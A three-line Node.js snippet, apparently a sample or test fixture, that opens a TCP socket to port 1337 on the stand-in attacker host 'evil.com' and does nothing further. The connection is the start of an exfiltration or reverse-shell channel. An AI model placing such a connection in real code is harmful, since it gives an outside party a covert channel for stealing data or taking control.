const net = require("net");
const client = new net.Socket();
client.connect(1337, "evil.com", () => {});
